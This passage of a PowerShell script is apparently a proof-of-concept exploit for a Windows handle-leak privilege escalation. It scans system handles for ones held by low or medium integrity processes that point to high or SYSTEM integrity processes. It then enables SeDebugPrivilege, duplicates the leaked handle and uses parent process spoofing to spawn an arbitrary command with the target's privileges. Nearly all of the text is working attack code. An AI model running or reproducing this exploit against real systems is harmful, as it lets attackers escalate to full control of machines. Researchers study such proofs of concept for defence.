                            if ($access -band [NativeMethodsV5]::PROCESS_DUP_HANDLE) {
                                $accessRights += "PROCESS_DUP_HANDLE"
                            }
                            if ($access -band [NativeMethodsV5]::PROCESS_VM_WRITE) {
                                $accessRights += "PROCESS_VM_WRITE"
                            }
                        } else {
                            if (($access -band [NativeMethodsV5]::THREAD_ALL_ACCESS) -eq [NativeMethodsV5]::THREAD_ALL_ACCESS) {
                                $accessRights += "THREAD_ALL_ACCESS"
                            }
                            if ($access -band [NativeMethodsV5]::THREAD_DIRECT_IMPERSONATION) {
                                $accessRights += "THREAD_DIRECT_IMPERSONATION"
                            }
                            if ($access -band [NativeMethodsV5]::THREAD_SET_CONTEXT) {
                                $accessRights += "THREAD_SET_CONTEXT"
                            }
                        }
                        
                        # Store handle value as UInt64 for later use
                        $handleValueUInt64 = [UInt64]($handleValue.ToInt64())
                        
                        $handles += [PSCustomObject]@{
                            OwnerPid = $ownerPid
                            OwnerIntegrity = $ownerIntegrity
                            HandleValue = $handleValueUInt64
                            HandleValueHex = "0x$($handleValueUInt64.ToString('X'))"
                            HandleType = $handleType
                            TargetPid = $targetPid
                            TargetTid = $targetTid
                            TargetIntegrity = $targetIntegrity
                            AccessRights = $accessRights -join ", "
                            GrantedAccess = "0x$($access.ToString('X8'))"
                        }
                    }
                } finally {
                    if ($hOwnerProcess -ne [IntPtr]::Zero) {
                        [NativeMethodsV5]::CloseHandle($hOwnerProcess) | Out-Null
                    }
                }
            }
        } finally {
            if ($hCurrentProcess -ne [IntPtr]::Zero) {
                [NativeMethodsV5]::CloseHandle($hCurrentProcess) | Out-Null
            }
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
    }
    
    return $handles
}

#endregion

#region Exploitation Functions

function Invoke-ExploitProcess {
    param(
        [int]$OwnerPid,
        [IntPtr]$HandleValue,
        [int]$TargetPid,
        [string]$Command
    )
    
    Write-Host "[*] Attempting to exploit leaked handle..." -ForegroundColor Yellow
    Write-Host "    Owner PID: $OwnerPid" -ForegroundColor Gray
    Write-Host "    Target PID: $TargetPid" -ForegroundColor Gray
    Write-Host "    Handle: $HandleValue" -ForegroundColor Gray
    
    # Resolve full path for command to avoid CreateProcess errors
    if ($Command -and -not [System.IO.Path]::IsPathRooted($Command)) {
        try {
            # Remove quotes if already present
            $Command = $Command.Trim('"', "'")
            $cmdInfo = Get-Command $Command -ErrorAction Stop
            if ($cmdInfo.Source) {
                $Command = $cmdInfo.Source
                Write-Verbose "Resolved command to: $Command"
            }
        } catch {
            Write-Warning "Could not resolve full path for command '$Command'. Attempting to use as-is."
        }
    }
    
    # Ensure command is not null or empty
    if ([string]::IsNullOrWhiteSpace($Command)) {
        Write-Error "Command cannot be null or empty"
        return $false
    }
    
    # Remove any existing quotes and re-add if needed
    $Command = $Command.Trim('"', "'")
    
    # Wrap command in quotes if it contains spaces (required by CreateProcess)
    if ($Command.Contains(' ')) {
        $Command = "`"$Command`""
    }
    
    $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $hDup = [IntPtr]::Zero
    $hOwnerProcess = [IntPtr]::Zero
    $hCurrentProcess = [IntPtr]::Zero
    
    try {
        # If handle is in another process, we need to duplicate it to ourselves
        if ($OwnerPid -ne $currentPid) {
            Write-Verbose "Handle is in process $OwnerPid, not current process. Attempting to duplicate..."
            
            $hOwnerProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_DUP_HANDLE, $false, $OwnerPid)
            if ($hOwnerProcess -eq [IntPtr]::Zero) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Error "Failed to open owner process. Error: $lastError"
                return $false
            }
            
            $hCurrentProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_ALL_ACCESS, $false, $currentPid)
            if ($hCurrentProcess -eq [IntPtr]::Zero) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Error "Failed to open current process. Error: $lastError"
                return $false
            }
            
            $dupStatus = [NativeMethodsV5]::NtDuplicateObject(
                $hOwnerProcess,
                $HandleValue,
                $hCurrentProcess,
                [ref]$hDup,
                0,
                0,
                [NativeMethodsV5]::DUPLICATE_SAME_ACCESS
            )
            
            if ($dupStatus -ne 0 -or $hDup -eq [IntPtr]::Zero) {
                Write-Error "Failed to duplicate handle. Status: 0x$($dupStatus.ToString('X8'))"
                return $false
            }
            
            $HandleValue = $hDup
            Write-Host "[+] Successfully duplicated handle to current process" -ForegroundColor Green
        } else {
            # Handle is already in current process, use it directly
            $hDup = $HandleValue
        }
        
        # Verify the handle points to the target process
        $SkipPidVerify = -1
        if ($TargetPid -ne $SkipPidVerify) {
            $verifyPid = [NativeMethodsV5]::GetProcessId($hDup)
            if ($verifyPid -ne $TargetPid -and $verifyPid -ne 0) {
                Write-Warning "Handle verification: Expected PID $TargetPid, got $verifyPid"
            }
        }
        
        # Use Parent Process Spoofing to spawn a child process
        # This requires PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        $PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
        $EXTENDED_STARTUPINFO_PRESENT = 0x00080000
        $CREATE_NEW_CONSOLE = 0x00000010
        
        $attributeListSize = [IntPtr]::Zero
        $attributeList = [IntPtr]::Zero
        
        # Get required size for attribute list
        if (-not [NativeMethodsV5]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$attributeListSize)) {
            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($lastError -ne 122) { # ERROR_INSUFFICIENT_BUFFER
                Write-Error "Failed to initialize attribute list size. Error: $lastError"
                return $false
            }
        }
        
        $attributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($attributeListSize.ToInt32())
        
        try {
            if (-not [NativeMethodsV5]::InitializeProcThreadAttributeList($attributeList, 1, 0, [ref]$attributeListSize)) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Error "Failed to initialize attribute list. Error: $lastError"
                return $false
            }
            
            $parentProcessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
            try {
                [System.Runtime.InteropServices.Marshal]::WriteIntPtr($parentProcessPtr, $hDup)
                
                if (-not [NativeMethodsV5]::UpdateProcThreadAttribute(
                    $attributeList,
                    0,
                    [IntPtr]$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    $parentProcessPtr,
                    [IntPtr][IntPtr]::Size,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero
                )) {
                    $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Write-Error "Failed to update proc thread attribute. Error: $lastError"
                    return $false
                }
                
                # Initialize STARTUPINFO structure
                $si = New-Object NativeMethodsV5+STARTUPINFO
                $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethodsV5+STARTUPINFOEX])
                $si.lpReserved = $null
                $si.lpDesktop = $null
                $si.lpTitle = $null
                $si.dwX = 0
                $si.dwY = 0
                $si.dwXSize = 0
                $si.dwYSize = 0
                $si.dwXCountChars = 0
                $si.dwYCountChars = 0
                $si.dwFillAttribute = 0
                $si.dwFlags = 0
                $si.wShowWindow = 0
                $si.cbReserved2 = 0
                $si.lpReserved2 = [IntPtr]::Zero
                $si.hStdInput = [IntPtr]::Zero
                $si.hStdOutput = [IntPtr]::Zero
                $si.hStdError = [IntPtr]::Zero
                
                $startupInfo = New-Object NativeMethodsV5+STARTUPINFOEX
                $startupInfo.StartupInfo = $si
                $startupInfo.lpAttributeList = $attributeList
                
                $processInfo = New-Object NativeMethodsV5+PROCESS_INFORMATION
                
                Write-Host "[*] Spawning process: $Command" -ForegroundColor Yellow
                Write-Verbose "Command line: '$Command'"
                Write-Verbose "Command length: $($Command.Length)"
                
                # Ensure Command is not null or empty
                if ([string]::IsNullOrEmpty($Command)) {
                    Write-Error "Command cannot be null or empty"
                    return $false
                }
                
                # Verify the command exists if it's a full path
                if ([System.IO.Path]::IsPathRooted($Command) -and -not (Test-Path $Command.Trim('"'))) {
                    Write-Warning "Command path does not exist: $Command"
                }
                
                # Clear any previous error
                [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() | Out-Null
                
                $success = [NativeMethodsV5]::CreateProcess(
                    $null,
                    $Command,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero,
                    $false,
                    $EXTENDED_STARTUPINFO_PRESENT -bor $CREATE_NEW_CONSOLE,
                    [IntPtr]::Zero,
                    $null,
                    [ref]$startupInfo,
                    [ref]$processInfo
                )
                
                if ($success) {
                    Write-Host "[+] Successfully spawned process with PID $($processInfo.dwProcessId)" -ForegroundColor Green
                    Write-Host "[+] Process should have inherited privileges from target process $TargetPid" -ForegroundColor Green
                    
                    [NativeMethodsV5]::CloseHandle($processInfo.hProcess) | Out-Null
                    [NativeMethodsV5]::CloseHandle($processInfo.hThread) | Out-Null
                    
                    return $true
                } else {
                    $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    $errorMsg = switch ($lastError) {
                        2 { "ERROR_FILE_NOT_FOUND - The system cannot find the file specified" }
                        3 { "ERROR_PATH_NOT_FOUND - The system cannot find the path specified" }
                        5 { "ERROR_ACCESS_DENIED - Access is denied" }
                        123 { "ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect" }
                        206 { "ERROR_FILENAME_EXCED_RANGE - The filename or extension is too long" }
                        default { "Error code: $lastError" }
                    }
                    Write-Error "Failed to create process. $errorMsg"
                    Write-Verbose "Command attempted: '$Command'"
                    Write-Verbose "Full error details: LastError=$lastError, CommandLength=$($Command.Length)"
                    return $false
                }
            } finally {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($parentProcessPtr)
            }
        } finally {
            [NativeMethodsV5]::DeleteProcThreadAttributeList($attributeList)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($attributeList)
        }
    } finally {
        # Cleanup duplicated handle if we created it
        if ($OwnerPid -ne $currentPid -and $hDup -ne [IntPtr]::Zero) {
            [NativeMethodsV5]::CloseHandle($hDup) | Out-Null
        }
        if ($hOwnerProcess -ne [IntPtr]::Zero) {
            [NativeMethodsV5]::CloseHandle($hOwnerProcess) | Out-Null
        }
        if ($hCurrentProcess -ne [IntPtr]::Zero) {
            [NativeMethodsV5]::CloseHandle($hCurrentProcess) | Out-Null
        }
    }
}

#endregion

#region Main Logic

function Invoke-HandleExploit {
    Write-Host "Handle Leak Exploit PoC (CVE-2025-6759 style)" -ForegroundColor Cyan
    Write-Host ""
    
    # Enable SeDebugPrivilege for better access
    Write-Verbose "Attempting to enable SeDebugPrivilege..."
    $privEnabled = Enable-SeDebugPrivilege
    if (-not $privEnabled) {
        Write-Warning "Failed to enable SeDebugPrivilege. Some operations may fail."
    }
    
    # Manual handle mode
    if ($ManualHandle -ne "") {
        if ($TargetPid -eq 0) {
            Write-Error "Manual handle mode requires -TargetPid to specify the owner process."
            return
        }
        
        if (-not $Exploit) {
            Write-Warning "Manual handle mode requires -Exploit switch"
            return
        }
        
        Write-Host "[*] Manual handle mode" -ForegroundColor Yellow
        Write-Host "    Target PID: $TargetPid" -ForegroundColor Gray
        Write-Host "    Handle: $ManualHandle" -ForegroundColor Gray
        
        # Parse handle value
        $handleValueStr = $ManualHandle
        if ($handleValueStr -notmatch "^0x") {
            $handleValueStr = "0x$handleValueStr"
        }
        
        try {
            $handleValue = [IntPtr]::new([long]$handleValueStr)
        } catch {
            Write-Error "Invalid handle value format: $ManualHandle"
            return
        }
        
        # Try to duplicate and identify the target
        $hOwnerProcess = [IntPtr]::Zero
        $hCurrentProcess = [IntPtr]::Zero
        $hDup = [IntPtr]::Zero
        
        try {
            $hOwnerProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_DUP_HANDLE, $false, $TargetPid)
            if ($hOwnerProcess -eq [IntPtr]::Zero) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Error "Failed to open target process $TargetPid. Error: $lastError"
                return
            }
            
            $hCurrentProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_ALL_ACCESS, $false, [System.Diagnostics.Process]::GetCurrentProcess().Id)
            if ($hCurrentProcess -eq [IntPtr]::Zero) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Error "Failed to open current process. Error: $lastError"
                return
            }
            
            $dupStatus = [NativeMethodsV5]::NtDuplicateObject(
                $hOwnerProcess,
                $handleValue,
                $hCurrentProcess,
                [ref]$hDup,
                0,
                0,
                0
            )
            
            if ($dupStatus -ne 0 -or $hDup -eq [IntPtr]::Zero) {
                Write-Error "Failed to duplicate handle. Status: 0x$($dupStatus.ToString('X8'))"
                return
            }
            
            $targetPid = [NativeMethodsV5]::GetProcessId($hDup)
            if ($targetPid -eq 0) {
                Write-Error "Handle does not point to a valid process"
                return
            }
            
            Write-Host "[+] Handle points to process $targetPid" -ForegroundColor Green
            
            # Attempt exploitation
            $success = Invoke-ExploitProcess -OwnerPid $TargetPid -HandleValue $handleValue -TargetPid $targetPid -Command $Command
            if ($success) {
                Write-Host "[+] Exploitation successful!" -ForegroundColor Green
            }
        } finally {
            if ($hDup -ne [IntPtr]::Zero) {
                [NativeMethodsV5]::CloseHandle($hDup) | Out-Null
            }
            if ($hCurrentProcess -ne [IntPtr]::Zero) {
                [NativeMethodsV5]::CloseHandle($hCurrentProcess) | Out-Null
            }
            if ($hOwnerProcess -ne [IntPtr]::Zero) {
                [NativeMethodsV5]::CloseHandle($hOwnerProcess) | Out-Null
            }
        }
        return
    }
    
    if ($TargetPid -ne 0) {
        Write-Host "[*] Scanning handles in process $TargetPid" -ForegroundColor Yellow
    } elseif ($TargetTid -ne 0) {
        Write-Host "[*] Scanning for handles targeting Thread ID $TargetTid..." -ForegroundColor Yellow
    } else {
        Write-Host "[*] Scanning all system handles..." -ForegroundColor Yellow
    }
    
    $handles = Get-SystemHandles -FilterPid $TargetPid

    # Filter by TargetTid if specified
    if ($TargetTid -ne 0) {
        $handles = $handles | Where-Object { $_.TargetTid -eq $TargetTid }
    }
    
    if ($handles.Count -eq 0) {
        Write-Host "[-] No interesting handles found" -ForegroundColor Red
        return
    }
    
    Write-Host "[+] Found $($handles.Count) interesting handles" -ForegroundColor Green
    Write-Host ""
    
    # Filter for "golden" handles: Low/Medium integrity owner -> High/System integrity target
    $vulnerableHandles = @()
    
    foreach ($handle in $handles) {
        $ownerLevel = $handle.OwnerIntegrity
        $targetLevel = $handle.TargetIntegrity
        
        if ($Force -or (($ownerLevel -eq "Low" -or $ownerLevel -eq "Medium") -and 
            ($targetLevel -eq "High" -or $targetLevel -eq "System"))) {
            $vulnerableHandles += $handle
        }
    }
    
    if ($vulnerableHandles.Count -eq 0) {
        Write-Host "[-] No vulnerable handles found (Low/Medium -> High/System)" -ForegroundColor Red
        Write-Host ""
        Write-Host "All interesting handles:" -ForegroundColor Yellow
        $handles | Format-Table -AutoSize
        return
    }
    
    if ($Force) {
        Write-Host "[!] Found $($vulnerableHandles.Count) handles to exploit (Force enabled)!" -ForegroundColor Red
    } else {
        Write-Host "[!] Found $($vulnerableHandles.Count) VULNERABLE handles!" -ForegroundColor Red
    }
    Write-Host ""
    
    # Display with HandleValueHex for readability
    $vulnerableHandles | Select-Object OwnerPid, OwnerIntegrity, HandleValueHex, HandleType, TargetPid, TargetTid, TargetIntegrity, AccessRights, GrantedAccess | Format-Table -AutoSize
    
    if ($Exploit) {
        Write-Host ""
        Write-Host "[*] Exploitation mode enabled" -ForegroundColor Yellow
        
        $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
        $exploited = $false
        
        foreach ($handle in $vulnerableHandles) {
            Write-Verbose "Checking handle: Owner=$($handle.OwnerPid) Type=$($handle.HandleType) Target=$($handle.TargetPid)"
            
            if ($handle.HandleType -eq "Process") {
                # If target PID is 0/null but we have a valid handle, try to resolve it again just in case
                if (-not $handle.TargetPid) {
                    Write-Verbose "Handle $($handle.HandleValueHex) has no TargetPid. Attempting last-ditch resolution..."
                    # We can't easily re-duplicate here without more context, but we can skip strict checks if Force is on
                    if ($Force) {
                         Write-Warning "Handle $($handle.HandleValueHex) has no resolved TargetPid, but Force is enabled. Attempting blind exploitation."
                         # Assume target is valid for exploitation attempt
                         $handle.TargetPid = -1 # Skip PID verification, the exploit function validates the handle anyway
                    } else {
                        continue
                    }
                }
            
                if ($handle.TargetPid) {
                    # Convert handle value from UInt64 to IntPtr (handle value in owner process)
                    $handleValue = [IntPtr]::new([int64]$handle.HandleValue)
                    
                    Write-Host ""
                    Write-Host "[*] Attempting exploitation..." -ForegroundColor Yellow
                    $success = Invoke-ExploitProcess -OwnerPid $handle.OwnerPid -HandleValue $handleValue -TargetPid $handle.TargetPid -Command $Command
                    if ($success) {
                        Write-Host "[+] Exploitation successful!" -ForegroundColor Green
                        $exploited = $true
                        break
                    }
                }
            } else {
                Write-Verbose "Skipping handle (Type: $($handle.HandleType), TargetPid: $($handle.TargetPid))"
            }
        }
        
        if (-not $exploited) {
            Write-Host ""
            Write-Host "[-] Failed to exploit any handles" -ForegroundColor Red
        }
    } else {
        Write-Host ""
        Write-Host "[*] Use -Exploit switch to attempt exploitation" -ForegroundColor Yellow
    }
}


#endregion

# Execute main function
Invoke-HandleExploit
